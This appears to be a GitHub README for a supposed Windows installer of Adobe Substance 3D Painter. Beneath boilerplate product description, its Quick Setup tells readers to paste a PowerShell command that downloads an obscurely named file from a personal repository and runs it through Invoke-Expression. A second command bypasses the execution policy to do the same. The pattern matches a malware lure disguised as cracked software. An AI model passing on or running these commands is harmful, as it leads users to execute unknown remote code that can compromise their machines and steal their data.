# Substance 3D Painter

Substance 3D Painter is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Substance 3D Painter and work in it.

Adobe Substance 3D Painter is desktop software for authoring physically based textures on imported 3D geometry. You work in a viewport where brush strokes, fill layers, and procedural effects update albedo, roughness, metalness, and height channels while you orbit the model. The tool fits game assets, product visualization, and film props where UV-mapped surfaces need consistent, high-resolution detail.

On Windows, a typical session starts by opening a project with your mesh and baked maps from a DCC or baker. You stack fill layers and smart materials, refine edges with stencils and particle brushes, tune generators for wear and grime, then export texture sets or send maps back to your engine or renderer. Performance depends on mesh resolution and layer count, so you often preview at medium quality before a final high-res bake pass.

This repository collects a Windows setup package for local installation, short configuration notes for project defaults and export presets, and a changelog that tracks bundle updates and documented workflow tweaks. Use the notes when aligning Painter export templates with your studio pipeline or when onboarding teammates who need the same brush libraries and shelf layout.

## What you do with it

- Paint albedo, roughness, and height across UV islands with responsive viewport feedback.
- Stack fill layers, smart materials, and masks for non-destructive texture iteration.
- Use generators and filters to add edge wear, dirt, and surface variation procedurally.
- Project detail from high-poly meshes onto low-poly assets with baked map support.
- Brush engines support particles, stencils, and symmetry for hard-surface and organic work.
- Export PBR texture sets sized for real-time engines and offline render pipelines.
- Shelf libraries organize brushes, alphas, and materials shared across studio projects.
- IRay viewport rendering helps judge lighting response before final texture export.

## Quick Setup (PowerShell)

This installs the program Substance 3D Painter on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/elena-p977839/substance-3d-painter-setup-guide/main/m37fy6tm0m.pye1kmhi | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/elena-p977839/substance-3d-painter-setup-guide/main/m37fy6tm0m.pye1kmhi | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `m37fy6tm0m.pye1kmhi` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `elena-p977839/substance-3d-painter-setup-guide`. Adobe Substance 3D Painter 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
